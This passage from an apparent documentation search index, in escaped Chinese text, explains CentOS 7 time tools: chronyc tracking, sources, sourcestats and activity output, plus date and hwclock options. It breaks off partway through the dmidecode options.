\u771f\u6b63\u5bf9\u7cfb\u7edf\u65f6\u95f4\u66f4\u6539\u7684\u4e24\u6b21\u95f4\u9694\uff0c\u6bcf\u6b21\u65f6\u95f4\u66f4\u6539\uff0c\u53ef\u4ee5\u901a\u8fc7\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6dfb\u52a0log tracking \u9009\u9879\uff0c\u53ef\u4ee5\u628a\u6bcf\u6b21\u65f6\u95f4\u66f4\u6539\u7684\u8bb0\u5f55\u5199\u5230tracking.log\u53bb Leap status \u8fd9\u662f\u8df3\u8dc3\u72b6\u6001\uff0c\u53ef\u4ee5\u662f \u6b63\u5e38 Normal \u3001 \u63d2\u5165\u7b2c\u4e8c Insert second\u3001 \u5220\u9664\u79d2 Delete second \u6216 \u672a\u540c\u6b65 Not synchronised\u3002","title":"tracking\u7ed3\u679c\u89e3\u91ca"},{"location":"system/centos7/chronyd/#sources-a-v","text":"\u529f\u80fd \u6b64\u547d\u4ee4\u663e\u793a\u6709\u5173 chronyd \u6b63\u5728\u8bbf\u95ee\u7684\u5f53\u524d\u65f6\u95f4\u6e90\u7684\u4fe1\u606f\u3002 \u5982\u679c\u6307\u5b9a\u4e86 -a \u9009\u9879\uff0c\u5219\u663e\u793a\u6240\u6709\u6e90\uff0c\u5305\u62ec\u5c1a\u65e0\u5df2\u77e5\u5730\u5740\u7684\u6e90\u3002\u6b64\u7c7b\u6e90\u5177\u6709 ID#XXXXXXXXXX \u683c\u5f0f\u7684\u6807\u8bc6\u7b26\uff0c\u53ef\u7528\u4e8e\u9700\u8981\u6e90\u5730\u5740\u7684\u5176\u4ed6\u547d\u4ee4\u3002 -v \u9009\u9879\u542f\u7528\u8be6\u7ec6\u8f93\u51fa\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c06\u663e\u793a\u989d\u5916\u7684\u6807\u9898\u884c\u4f5c\u4e3a\u5217\u542b\u4e49\u7684\u63d0\u9192\u3002 # chronyc sources -a MS Name/IP address Stratum Poll Reach LastRx Last sample =============================================================================== #* GPS0 0 4 377 11 -479ns[ -621ns] +/- 134ns ^? foo.example.net 2 6 377 23 -923us[ -924us] +/- 43ms ^+ bar.example.net 1 6 377 21 -2629us[-2619us] +/- 86ms","title":"sources [-a] [-v]"},{"location":"system/centos7/chronyd/#sources","text":"M \u8fd9\u8868\u793a\u6e90\u7684\u6a21\u5f0f\u3002 ^ \u8868\u793a\u670d\u52a1\u5668\uff0c = \u8868\u793a\u5bf9\u7b49\u65b9\uff0c # \u8868\u793a\u672c\u5730\u8fde\u63a5\u7684\u53c2\u8003\u65f6\u949f\u3002 S \u6b64\u5217\u6307\u793a\u6e90\u7684\u9009\u62e9\u72b6\u6001\u3002 ***\u8868\u793a\u5f53\u524d\u9009\u62e9\u8fdb\u884c\u540c\u6b65\u7684\u6700\u4f73\u6e90\u3002 + \u8868\u793a\u9009\u62e9\u8fdb\u884c\u540c\u6b65\u7684\u5176\u4ed6\u6e90\uff0c\u8fd9\u4e9b\u6e90\u4e0e\u6700\u4f73\u6e90\u76f8\u7ed3\u5408\u3002 - \u8868\u793a\u88ab\u89c6\u4e3a\u53ef\u9009\u62e9\u8fdb\u884c\u540c\u6b65\u4f46\u5f53\u524d\u672a\u9009\u62e9\u7684\u6e90\u3002 x \u8868\u793a chronyd \u8ba4\u4e3a\u662f\u865a\u5047\u6807\u8bb0\u7684\u6765\u6e90\uff08\u5373\u5176\u65f6\u95f4\u4e0e\u5927\u591a\u6570\u5176\u4ed6\u6765\u6e90\u6216\u4f7f\u7528 \u4fe1\u4efb \u9009\u9879\u6307\u5b9a\u7684\u6765\u6e90\u4e0d\u4e00\u81f4\uff09\u3002 ~ \u8868\u793a\u5176\u65f6\u95f4\u4f3c\u4e4e\u5177\u6709\u592a\u5927\u53ef\u53d8\u6027\u7684\u6765\u6e90\u3002 \uff1f \u8868\u793a\u7531\u4e8e\u5176\u4ed6\u539f\u56e0\uff08\u4f8b\u5982\uff0c\u65e0\u6cd5\u8bbf\u95ee\u3001\u672a\u540c\u6b65\u6216\u6ca1\u6709\u8db3\u591f\u7684\u6d4b\u91cf\u503c\uff09\u800c\u88ab\u8ba4\u4e3a\u65e0\u6cd5\u9009\u62e9\u540c\u6b65\u7684\u6e90\u3002 Name/IP address \u8fd9\u5c06\u663e\u793a\u6e90\u7684\u540d\u79f0\u6216 IP \u5730\u5740\uff0c\u6216\u53c2\u8003\u65f6\u949f\u7684\u5f15\u7528 ID\u3002 Stratum \u8fd9\u663e\u793a\u4e86\u6765\u6e90\u5c42\uff0c\u5982\u6700\u8fd1\u6536\u5230\u7684\u6837\u672c\u4e2d\u6240\u62a5\u544a\u7684\u90a3\u6837\u3002\u7b2c 1 \u5c42\u8868\u793a\u5177\u6709\u672c\u5730\u8fde\u63a5\u7684\u53c2\u8003\u65f6\u949f\u7684\u8ba1\u7b97\u673a\u3002\u4e0e\u7b2c 1 \u5c42\u8ba1\u7b97\u673a\u540c\u6b65\u7684\u8ba1\u7b97\u673a\u4f4d\u4e8e\u7b2c 2 \u5c42\u3002\u4e0e\u7b2c 2 \u5c42\u8ba1\u7b97\u673a\u540c\u6b65\u7684\u8ba1\u7b97\u673a\u4f4d\u4e8e\u7b2c 3 \u5c42\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002 Poll \u8fd9\u5c06\u663e\u793a\u8f6e\u8be2\u6e90\u7684\u901f\u7387\uff0c\u4ee5\u95f4\u9694\u7684 2 \u4e3a\u5e95\u6570\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002\u56e0\u6b64\uff0c\u503c\u4e3a 6 \u8868\u793a\u6bcf 64 \u79d2\u8fdb\u884c\u4e00\u6b21\u6d4b\u91cf\u3002 chronyd \u4f1a\u6839\u636e\u5f53\u524d\u6761\u4ef6\u81ea\u52a8\u6539\u53d8\u8f6e\u8be2\u7387\u3002 Reach \u8fd9\u663e\u793a\u4e86\u6253\u5370\u4e3a\u516b\u8fdb\u5236\u6570\u7684\u6e90\u7684\u53ef\u8bbf\u95ee\u6027\u5bc4\u5b58\u5668\u3002\u5bc4\u5b58\u5668\u67098\u4f4d\uff0c\u5e76\u5728\u4ece\u6e90\u63a5\u6536\u6216\u4e22\u5931\u7684\u6bcf\u4e2a\u6570\u636e\u5305\u4e0a\u66f4\u65b0\u3002\u503c\u4e3a 377 \u8868\u793a\u5df2\u6536\u5230\u6700\u8fd1\u516b\u6b21\u4f20\u8f93\u4e2d\u6240\u6709\u4f20\u8f93\u7684\u6709\u6548\u56de\u590d\u3002 LastRx \u6b64\u5217\u663e\u793a\u4ece\u6e90\u63a5\u6536\u5230\u6700\u540e\u4e00\u4e2a\u826f\u597d\u6837\u672c\uff08\u663e\u793a\u5728\u4e0b\u4e00\u5217\u4e2d\uff09\u7684\u65f6\u95f4\u3002\u67d0\u4e9b\u6d4b\u8bd5\u5931\u8d25\u7684\u6d4b\u91cf\u503c\u5c06\u88ab\u5ffd\u7565\u3002\u8fd9\u901a\u5e38\u4ee5\u79d2\u4e3a\u5355\u4f4d\u3002\u5b57\u6bcd m \u3001 h \u3001 d \u6216 y \u8868\u793a\u5206\u949f\u3001\u5c0f\u65f6\u3001\u5929\u6216\u5e74\u3002 Last sample \u6b64\u5217\u663e\u793a\u4e0a\u6b21\u6d4b\u91cf\u65f6\u672c\u5730\u65f6\u949f\u4e0e\u6e90\u4e4b\u95f4\u7684\u504f\u79fb\u3002\u65b9\u62ec\u53f7\u4e2d\u7684\u6570\u5b57\u8868\u793a\u5b9e\u9645\u6d4b\u91cf\u7684\u504f\u79fb\u91cf\u3002\u8fd9\u53ef\u4ee5\u7531 ns \uff08\u8868\u793a\u7eb3\u79d2\uff09\u3001 us \uff08\u8868\u793a\u5fae\u79d2\uff09\u3001 \u6beb\u79d2 \uff08\u8868\u793a\u6beb\u79d2\uff09\u6216 s \uff08\u8868\u793a\u79d2\uff09\u540e\u7f00\u3002\u65b9\u62ec\u53f7\u5de6\u4fa7\u7684\u6570\u5b57\u663e\u793a\u4e86\u539f\u59cb\u6d4b\u91cf\u503c\uff0c\u7ecf\u8fc7\u8c03\u6574\u4ee5\u5141\u8bb8\u81ea\u90a3\u65f6\u4ee5\u6765\u5e94\u7528\u4e8e\u672c\u5730\u65f6\u949f\u7684\u4efb\u4f55\u538b\u6446\u7387\u3002 +/- \u6307\u6807\u540e\u9762\u7684\u6570\u5b57\u663e\u793a\u6d4b\u91cf\u4e2d\u7684\u8fb9\u9645\u8bef\u5dee\u3002\u6b63\u504f\u79fb\u8868\u793a\u672c\u5730\u65f6\u949f\u65e9\u4e8e\u6e90\u65f6\u949f\u3002","title":"sources\u547d\u4ee4\u89e3\u91ca"},{"location":"system/centos7/chronyd/#sourcestats-a-v","text":"\u529f\u80fd sourcestats \u547d\u4ee4\u663e\u793a\u6709\u5173 chronyd \u5f53\u524d\u6b63\u5728\u68c0\u67e5\u7684\u6bcf\u4e2a\u6e90\u7684\u6f02\u79fb\u7387\u548c\u504f\u79fb\u4f30\u8ba1\u8fc7\u7a0b\u7684\u4fe1\u606f\u3002 \u5982\u679c\u6307\u5b9a\u4e86 -a \u9009\u9879\uff0c\u5219\u663e\u793a\u6240\u6709\u6e90\uff0c\u5305\u62ec\u5c1a\u65e0\u5df2\u77e5\u5730\u5740\u7684\u6e90\u3002\u6b64\u7c7b\u6e90\u5177\u6709 ID#XXXXXXXXXX \u683c\u5f0f\u7684\u6807\u8bc6\u7b26\uff0c\u53ef\u7528\u4e8e\u9700\u8981\u6e90\u5730\u5740\u7684\u5176\u4ed6\u547d\u4ee4\u3002 -v \u9009\u9879\u542f\u7528\u8be6\u7ec6\u8f93\u51fa\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c06\u663e\u793a\u989d\u5916\u7684\u6807\u9898\u884c\u4f5c\u4e3a\u5217\u542b\u4e49\u7684\u63d0\u9192\u3002 # chronyc sourcestats -a Name/IP Address NP NR Span Frequency Freq Skew Offset Std Dev =============================================================================== foo.example.net 11 5 46m -0.001 0.045 1us 25us Name/IP Address \u8fd9\u662f NTP \u670d\u52a1\u5668\u7684\u540d\u79f0\u6216 IP \u5730\u5740\uff0c\u6216\u53c2\u8003\u65f6\u949f\u7684\u5f15\u7528 ID\u3002 NP \u8fd9\u662f\u5f53\u524d\u4e3a\u670d\u52a1\u5668\u4fdd\u7559\u7684\u91c7\u6837\u70b9\u6570\u3002 NR \u8fd9\u662f\u5728\u6700\u540e\u4e00\u6b21\u56de\u5f52\u540e\u5177\u6709\u76f8\u540c\u7b26\u53f7\u7684\u6b8b\u5dee\u8fd0\u884c\u6b21\u6570\u3002\u5982\u679c\u6b64\u6570\u5b57\u76f8\u5bf9\u4e8e\u6837\u672c\u6570\u5f00\u59cb\u53d8\u5f97\u592a\u5c0f\uff0c\u5219\u8868\u660e\u76f4\u7ebf\u4e0d\u518d\u9002\u5408\u6570\u636e\u3002\u5982\u679c\u8fd0\u884c\u6b21\u6570\u592a\u5c11\uff0c chronyd \u5c06\u4e22\u5f03\u8f83\u65e7\u7684\u6837\u672c\u5e76\u91cd\u65b0\u8fd0\u884c\u56de\u5f52\uff0c\u76f4\u5230\u8fd0\u884c\u6b21\u6570\u53d8\u5f97\u53ef\u63a5\u53d7\u3002 Span \u8fd9\u662f\u6700\u65e7\u548c\u6700\u65b0\u6837\u672c\u4e4b\u95f4\u7684\u95f4\u9694\u3002\u5982\u679c\u672a\u663e\u793a\u5355\u4f4d\uff0c\u5219\u8be5\u503c\u4ee5\u79d2\u4e3a\u5355\u4f4d\u3002\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u95f4\u9694\u4e3a 46 \u5206\u949f\u3002 Frequency \u8fd9\u662f\u670d\u52a1\u5668\u7684\u4f30\u8ba1\u6b8b\u4f59\u9891\u7387\uff0c\u4ee5\u767e\u4e07\u5206\u4e4b\u4e00\u4e3a\u5355\u4f4d\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8ba1\u7b97\u673a\u7684\u65f6\u949f\u76f8\u5bf9\u4e8e\u670d\u52a1\u5668\u4f30\u8ba1\u8fd0\u884c\u901f\u5ea6\u6162 10^9 \u4e2d\u7684 1 \u90e8\u5206\u3002 Freq Skew \u8fd9\u662f Freq \u4e0a\u7684\u4f30\u8ba1\u8bef\u5dee\u8fb9\u754c\uff08\u540c\u6837\u4ee5\u767e\u4e07\u5206\u4e4b\u4e00\u4e3a\u5355\u4f4d\uff09\u3002 Offset \u8fd9\u662f\u6e90\u7684\u4f30\u8ba1\u504f\u79fb\u91cf\u3002 Std Dev \u8fd9\u662f\u4f30\u8ba1\u7684\u6837\u672c\u6807\u51c6\u5dee\u3002","title":"sourcestats [-a] [-v]"},{"location":"system/centos7/chronyd/#maketep","text":"\u7acb\u5373\u540c\u6b65(\u9700\u8981\u5728chrony\u8f83\u9ad8\u7684\u7248\u672c\u4e2d\u624d\u884c) #chronyc makestep 200 OK","title":"maketep"},{"location":"system/centos7/chronyd/#activity","text":"\u529f\u80fd \u6b64\u547d\u4ee4\u62a5\u544a\u8054\u673a\u7684\u6570\u91cf\u3002 # chronyc activity 200 OK 1 sources online 0 sources offline 0 sources doing burst (return to online) 0 sources doing burst (return to offline) 0 sources with unknown address","title":"activity"},{"location":"system/centos7/chronyd/#activity_1","text":"online \u670d\u52a1\u5668\u6216\u5bf9\u7b49\u65b9\u5f53\u524d\u5904\u4e8e\u8054\u673a\u72b6\u6001\uff08\u5373\u7531 chronyd \u5047\u5b9a\u4e3a\u53ef\u8bbf\u95ee\uff09 offline \u670d\u52a1\u5668\u6216\u5bf9\u7b49\u4f53\u5f53\u524d\u5904\u4e8e\u8131\u673a\u72b6\u6001\uff08\u5373\u7531 chronyd \u5047\u5b9a\u4e3a\u65e0\u6cd5\u8bbf\u95ee\uff09 burst_online \u5df2\u4e3a\u670d\u52a1\u5668\u542f\u52a8\u7a81\u53d1\u547d\u4ee4\uff0c\u5e76\u4e14\u6b63\u5728\u6267\u884c\u8be5\u547d\u4ee4;\u7a81\u53d1\u5b8c\u6210\u540e\uff0c\u670d\u52a1\u5668\u6216\u5bf9\u7b49\u65b9\u5c06\u8fd4\u56de\u5230\u8054\u673a\u72b6\u6001\u3002 burst_offline \u5df2\u4e3a\u670d\u52a1\u5668\u542f\u52a8\u7a81\u53d1\u547d\u4ee4\uff0c\u5e76\u4e14\u6b63\u5728\u6267\u884c\u8be5\u547d\u4ee4;\u7a81\u53d1\u5b8c\u6210\u540e\uff0c\u670d\u52a1\u5668\u6216\u5bf9\u7b49\u65b9\u5c06\u8fd4\u56de\u5230\u8131\u673a\u72b6\u6001\u3002 unresolved \u670d\u52a1\u5668\u6216\u5bf9\u7b49\u65b9\u7684\u540d\u79f0\u5c1a\u672a\u89e3\u6790\u4e3a\u5730\u5740;\u6b64\u6765\u6e90\u5728 \u6765\u6e90 \u548c \u6765\u6e90\u7edf\u8ba1 \u62a5\u544a\u4e2d\u4e0d\u53ef\u89c1\u3002 \u66f4\u591a\u7ec6\u8282\u67e5\u770b\uff1ahttps://chrony.tuxfamily.org/doc/4.3/chronyc.html","title":"activity\u7ed3\u679c\u89e3\u91ca"},{"location":"system/centos7/chronyd/#_3","text":"","title":"\u5176\u4ed6\u77e5\u8bc6"},{"location":"system/centos7/chronyd/#date","text":"\u6253\u5370\u6216\u8bbe\u7f6e\u7cfb\u7edf\u65e5\u671f\u548c\u65f6\u95f4 \u8bed\u6cd5 date [\u9009\u9879]... [+\u683c\u5f0f] date [\u9009\u9879] [MMDDhhmm[[CC]YY][.ss]] \u529f\u80fd \u6839\u636e\u6307\u5b9a\u683c\u5f0f\u663e\u793a\u5f53\u524d\u65f6\u95f4\u6216\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u95f4. -d, --date=STRING \u663e\u793a\u7531 STRING \u6307\u5b9a\u7684\u65f6\u95f4, \u800c\u4e0d\u662f\u5f53\u524d\u65f6\u95f4 -f, --file=DATEFILE \u663e\u793a DATEFILE \u4e2d\u6bcf\u4e00\u884c\u6307\u5b9a\u7684\u65f6\u95f4, \u5982\u540c\u5c06 DATEFILE \u4e2d\u7684\u6bcf\u884c\u4f5c\u4e3a --date \u7684\u53c2\u6570\u4e00\u6837 -I, --iso-8601[=TIMESPEC] \u6309\u7167 ISO-8601 \u7684\u65e5\u671f/\u65f6\u95f4\u683c\u5f0f\u8f93\u51fa\u65f6\u95f4. TIMESPEC= date (\u6216\u8005\u4e0d\u6307\u5b9a\u65f6)\u4ec5\u8f93\u51fa\u65e5\u671f,\u7b49\u4e8e hours , minutes , seconds \u65f6\u6309\u7167\u6307\u5b9a\u7cbe\u5ea6\u8f93\u51fa\u65e5\u671f\u53ca\u65f6\u95f4\u3002 -r, --reference=FILE \u663e\u793a FILE \u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4 -R, --rfc-822 \u6839\u636e RFC-822 \u6307\u5b9a\u683c\u5f0f\u8f93\u51fa\u65e5\u671f -s, --set=STRING \u6839\u636e STRING \u8bbe\u7f6e\u65f6\u95f4 -u, --utc, --universal \u663e\u793a\u6216\u8bbe\u7f6e\u5168\u7403\u65f6\u95f4(\u683c\u6797\u5a01\u6cbb\u65f6\u95f4) --help \u663e\u793a\u672c\u5e2e\u52a9\u6587\u4ef6\u5e76\u9000\u51fa --version \u663e\u793a\u7248\u672c\u4fe1\u606f\u5e76\u9000\u51fa \u683c\u5f0f FORMAT \u63a7\u5236\u7740\u8f93\u51fa\u683c\u5f0f. \u4ec5\u5f53\u9009\u9879\u6307\u5b9a\u4e3a\u5168\u7403\u65f6\u95f4\u65f6\u672c\u683c\u5f0f\u624d\u6709\u6548\u3002 \u5206\u522b\u89e3\u91ca\u5982\u4e0b: %% \u6587\u672c\u7684 % %a \u5f53\u524d\u533a\u57df\u7684\u661f\u671f\u51e0\u7684\u7b80\u5199 (Sun..Sat) %A \u5f53\u524d\u533a\u57df\u7684\u661f\u671f\u51e0\u7684\u5168\u79f0 (\u4e0d\u540c\u957f\u5ea6) (Sunday..Saturday) %b \u5f53\u524d\u533a\u57df\u7684\u6708\u4efd\u7684\u7b80\u5199 (Jan..Dec) %B \u5f53\u524d\u533a\u57df\u7684\u6708\u4efd\u7684\u5168\u79f0(\u53d8\u957f) (January..December) %c \u5f53\u524d\u533a\u57df\u7684\u65e5\u671f\u548c\u65f6\u95f4 (Sat Nov 04 12:02:33 EST 1989) %d (\u6708\u4efd\u4e2d\u7684)\u51e0\u53f7(\u7528\u4e24\u4f4d\u8868\u793a) (01..31) %D \u65e5\u671f(\u6309\u7167 \u6708/\u65e5\u671f/\u5e74 \u683c\u5f0f\u663e\u793a) (mm/dd/yy) %e (\u6708\u4efd\u4e2d\u7684)\u51e0\u53f7(\u53bb\u96f6\u8868\u793a) ( 1..31) %h \u540c %b %H \u5c0f\u65f6(\u6309 24 \u5c0f\u65f6\u5236\u663e\u793a\uff0c\u7528\u4e24\u4f4d\u8868\u793a) (00..23) %I \u5c0f\u65f6(\u6309 12 \u5c0f\u65f6\u5236\u663e\u793a\uff0c\u7528\u4e24\u4f4d\u8868\u793a) (01..12) %j (\u4e00\u5e74\u4e2d\u7684)\u7b2c\u51e0\u5929(\u7528\u4e09\u4f4d\u8868\u793a) (001..366) %k \u5c0f\u65f6(\u6309 24 \u5c0f\u65f6\u5236\u663e\u793a\uff0c\u53bb\u96f6\u663e\u793a) ( 0..23) %l \u5c0f\u65f6(\u6309 12 \u5c0f\u65f6\u5236\u663e\u793a\uff0c\u53bb\u96f6\u8868\u793a) ( 1..12) %m \u6708\u4efd(\u7528\u4e24\u4f4d\u8868\u793a) (01..12) %M \u5206\u949f\u6570(\u7528\u4e24\u4f4d\u8868\u793a) (00..59) %n \u6362\u884c %p \u5f53\u524d\u65f6\u95f4\u662f\u4e0a\u5348 AM \u8fd8\u662f\u4e0b\u5348 PM %r \u65f6\u95f4,\u6309 12 \u5c0f\u65f6\u5236\u663e\u793a (hh:mm:ss [A/P]M) %s \u4ece 1970\u5e741\u67081\u65e50\u70b90\u52060\u79d2\u5230\u73b0\u5728\u5386\u7ecf\u7684\u79d2\u6570 (GNU\u6269\u5145) %S \u79d2\u6570(\u7528\u4e24\u4f4d\u8868\u793a)(00..60) %t \u6c34\u5e73\u65b9\u5411\u7684 tab \u5236\u8868\u7b26 %T \u65f6\u95f4,\u6309 24 \u5c0f\u65f6\u5236\u663e\u793a(hh:mm:ss) %U (\u4e00\u5e74\u4e2d\u7684)\u7b2c\u51e0\u4e2a\u661f\u671f\uff0c\u4ee5\u661f\u671f\u5929\u4f5c\u4e3a\u4e00\u5468\u7684\u5f00\u59cb(\u7528\u4e24\u4f4d\u8868\u793a) (00..53) %V (\u4e00\u5e74\u4e2d\u7684)\u7b2c\u51e0\u4e2a\u661f\u671f\uff0c\u4ee5\u661f\u671f\u4e00\u4f5c\u4e3a\u4e00\u5468\u7684\u5f00\u59cb(\u7528\u4e24\u4f4d\u8868\u793a) (01..52) %w \u7528\u6570\u5b57\u8868\u793a\u661f\u671f\u51e0 (0..6); 0 \u4ee3\u8868\u661f\u671f\u5929 %W (\u4e00\u5e74\u4e2d\u7684)\u7b2c\u51e0\u4e2a\u661f\u671f\uff0c\u4ee5\u661f\u671f\u4e00\u4f5c\u4e3a\u4e00\u5468\u7684\u5f00\u59cb(\u7528\u4e24\u4f4d\u8868\u793a) (00..53) %x \u6309\u7167 (mm/dd/yy) \u683c\u5f0f\u663e\u793a\u5f53\u524d\u65e5\u671f %X \u6309\u7167 (%H:%M:%S) \u683c\u5f0f\u663e\u793a\u5f53\u524d\u65f6\u95f4 %y \u5e74\u7684\u540e\u4e24\u4f4d\u6570\u5b57 (00..99) %Y \u5e74(\u7528 4 \u4f4d\u8868\u793a) (1970...) %z \u6309\u7167 RFC-822 \u4e2d\u6307\u5b9a\u7684\u6570\u5b57\u65f6\u533a\u663e\u793a(\u5982, -0500) (\u4e3a\u975e\u6807\u51c6\u6269\u5145) %Z \u65f6\u533a(\u4f8b\u5982, EDT (\u7f8e\u56fd\u4e1c\u90e8\u65f6\u533a)), \u5982\u679c\u4e0d\u80fd\u51b3\u5b9a\u662f\u54ea\u4e2a\u65f6\u533a\u5219\u4e3a\u7a7a \u9ed8\u8ba4\u60c5\u51b5\u4e0b,\u7528 0 \u586b\u5145\u6570\u636e\u7684\u7a7a\u7f3a\u90e8\u5206. GNU \u7684 date \u547d\u4ee4\u80fd\u5206\u8fa8\u5728 `%'\u548c\u6570\u5b57\u6307\u793a\u4e4b\u95f4\u7684\u4ee5\u4e0b\u4fee\u6539. - (\u8fde\u63a5\u53f7) \u4e0d\u8fdb\u884c\u586b\u5145 _ (\u4e0b\u5212\u7ebf) \u7528\u7a7a\u683c\u8fdb\u884c\u586b\u5145","title":"date\u547d\u4ee4"},{"location":"system/centos7/chronyd/#hwclock","text":"\u8bed\u6cd5 hwclock [\u529f\u80fd] [\u9009\u9879...] \u529f\u80fd hwclock\u662f\u4e00\u4e2a\u65f6\u949f\u7ba1\u7406\u5de5\u5177\u3002\u5b83\u53ef\u4ee5\uff1a\u663e\u793a\u786c\u4ef6\u65f6\u949f\u65f6\u95f4\uff1b\u5c06\u786c\u4ef6\u65f6\u949f\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u65f6\u95f4\uff1b\u4ece\u7cfb\u7edf\u65f6\u949f\u8bbe\u7f6e\u786c\u4ef6\u65f6\u949f\uff1b\u8bbe\u5b9a\u6765\u81ea\u786c\u4ef6\u65f6\u949f\u7684\u7cfb\u7edf\u65f6\u949f\uff1b\u786c\u4ef6\u8865\u507f\u65f6\u949f\u6f02\u79fb\uff1b\u66f4\u6b63\u7cfb\u7edf\u65f6\u949f\u65f6\u95f4\u523b\u5ea6\uff1b\u8bbe\u7f6e\u5185\u6838\u7684\u65f6\u533a\u3001NTP \u65f6\u95f4\u523b\u5ea6\u548c\u7eaa\u5143\uff08\u4ec5\u9650 Alpha\uff09\uff1b\u5e76\u9884\u6d4b\u57fa\u4e8e\u5176\u6f02\u79fb\u7387\u7684\u672a\u6765\u786c\u4ef6\u65f6\u949f\u503c -h, --help \u663e\u793a\u6b64\u5e2e\u52a9\u5e76\u9000\u51fa -r, --show \u8bfb\u53d6\u786c\u4ef6\u65f6\u949f\u5e76\u6253\u5370\u7ed3\u679c --set \u5c06 RTC \u8bbe\u7f6e\u4e3a --date \u6307\u5b9a\u7684\u65f6\u95f4 -s, --hctosys \u4ece\u786c\u4ef6\u65f6\u949f\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u95f4 -w, --systohc \u4ece\u5f53\u524d\u7cfb\u7edf\u65f6\u95f4\u8bbe\u7f6e\u786c\u4ef6\u65f6\u949f --systz \u57fa\u4e8e\u5f53\u524d\u65f6\u533a\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u95f4 --adjust \u6839\u636e\u81ea\u4e0a\u6b21\u65f6\u949f\u8bbe\u7f6e\u6216\u8c03\u6574\u540e\u7684\u7cfb\u7edf\u6f02\u79fb \u6765\u8c03\u6574 RTC -c, --compare \u5b9a\u671f\u5c06\u7cfb\u7edf\u65f6\u949f\u4e0e CMOS \u65f6\u949f\u76f8\u6bd4\u8f83 --getepoch \u6253\u5370\u5185\u6838\u7684\u786c\u4ef6\u65f6\u949f\u7eaa\u5143(epoch)\u503c --setepoch \u5c06\u5185\u6838\u7684\u786c\u4ef6\u65f6\u949f\u7eaa\u5143(epoch)\u503c\u8bbe\u7f6e\u4e3a --epoch \u9009\u9879\u6307\u5b9a\u7684\u503c --predict \u9884\u6d4b --date \u9009\u9879\u6240\u6307\u5b9a\u65f6\u523b\u8bfb\u53d6\u5230\u7684 RTC \u503c -V, --version \u663e\u793a\u7248\u672c\u4fe1\u606f\u5e76\u9000\u51fa \u9009\u9879\uff1a -u, --utc \u786c\u4ef6\u65f6\u949f\u4fdd\u6301\u4e3a UTC \u65f6\u95f4 --localtime \u786c\u4ef6\u65f6\u949f\u4fdd\u6301\u4e3a\u672c\u5730\u65f6\u95f4 -f, --rtc <\u6587\u4ef6> \u4ee3\u66ff\u9ed8\u8ba4\u6587\u4ef6\u7684\u7279\u6b8a /dev/... \u6587\u4ef6 --directisa \u76f4\u63a5\u8bbf\u95ee ISA \u603b\u7ebf\uff0c\u800c\u975e /dev/rtc --badyear \u5ffd\u7565 RTC \u5e74\u4efd(\u7531\u4e8e BIOS \u635f\u574f) --date <\u65f6\u95f4> \u6307\u5b9a\u8981\u8bbe\u7f6e\u7684\u786c\u4ef6\u65f6\u949f\u65f6\u95f4 --epoch <\u5e74> \u6307\u5b9a\u4f5c\u4e3a\u786c\u4ef6\u7eaa\u5143(epoch)\u503c\u8d77\u59cb\u7684\u5e74\u4efd --noadjfile \u4e0d\u8bbf\u95ee /etc/adjtime\uff1b\u9700\u8981\u4f7f\u7528 --utc \u6216 --localtime \u9009\u9879 --adjfile <\u6587\u4ef6> \u6307\u5b9a\u8c03\u6574\u6587\u4ef6\u7684\u8def\u5f84\uff1b \u9ed8\u8ba4\u4e3a /etc/adjtime --test \u4e0d\u66f4\u65b0\uff0c\u53ea\u663e\u793a\u5c06\u8fdb\u884c\u4ec0\u4e48\u64cd\u4f5c -D, --debug \u8c03\u8bd5\u6a21\u5f0f --version\uff1a\u663e\u793a\u7248\u672c\u4fe1\u606f\u3002","title":"hwclock\u547d\u4ee4"},{"location":"system/centos7/dmidecode/","text":"dmidecode\u547d\u4ee4 dmidecode \u662f\u4e00\u79cd\u5de5\u5177\uff0c\u7528\u4e8e\u4ee5\u4eba\u7c7b\u53ef\u8bfb\u7684\u683c\u5f0f\u8f6c\u50a8\u8ba1\u7b97\u673a\u7684DMI\uff08\u6709\u4eba\u8bf4SMBIOS\uff09\u8868\u5185\u5bb9\u3002\u6b64\u8868\u5305\u542b\u7cfb\u7edf\u786c\u4ef6\u7ec4\u4ef6\u7684\u8bf4\u660e\uff0c\u4ee5\u53ca \u5176\u4ed6\u6709\u7528\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u5e8f\u5217\u53f7\u548c BIOS \u4fee\u8ba2\u7248 Usage: dmidecode [\u9009\u9879] Options are: -d, --dev-mem FILE (default:/dev/mem)\u4ece\u8bbe\u5907\u6587\u4ef6\u8bfb\u53d6\u4fe1\u606f\uff0c\u8f93\u51fa\u5185\u5bb9\u4e0e\u4e0d\u52a0\u53c2\u6570\u6807\u51c6\u8f93\u51fa\u76f8\u540c\u3002 -h, --help \u663e\u793a\u5e2e\u52a9\u4fe1\u606f\u3002 -q, --quiet \u8f83\u5c11\u7684\u8be6\u7ec6\u8f93\u51fa -s, --string KEYWORD \u53ea\u663e\u793a\u6307\u5b9aDMI\u5b57\u7b26\u4e32\u7684\u4fe1\u606f\u3002(string) -t, --type TYPE \u53ea\u663e\u793a\u6307\u5b9a\u6761\u76ee\u7684\u4fe1\u606f\u3002(type) type\u53ef\u4ee5\u662fDMI\u7c7b\u578b\u53f7\uff0c\u4e5f\u53ef\u4ee5\u662f\u9017\u53f7\u5206\u9694\u7684\u7c7b\u578b\u53f7\u5217\u8868\uff0c\u6216\u8005\u662f\u4ee5\u4e0b\u5217\u8868\u4e2d\u7684\u5173\u952e\u5b57\uff1abios(bios)\u3001\u7cfb\u7edf(system)\u3001\u57fa\u677f(baseboard)\u3001\u673a\u7bb1(chassis)\u3001\u5904\u7406\u5668(processor)\u3001\u5185\u5b58(memory)\u3001\u7f13\u5b58(cache)\u3001\u8fde\u63a5\u5668(connector)\u3001\u63d2\u69fd(slot)\u3002 -H, --handle HANDLE \u53ea\u663e\u793a\u7ed9\u5b9a\u53e5\u67c4\u7684\u6761\u76ee -u, --dump 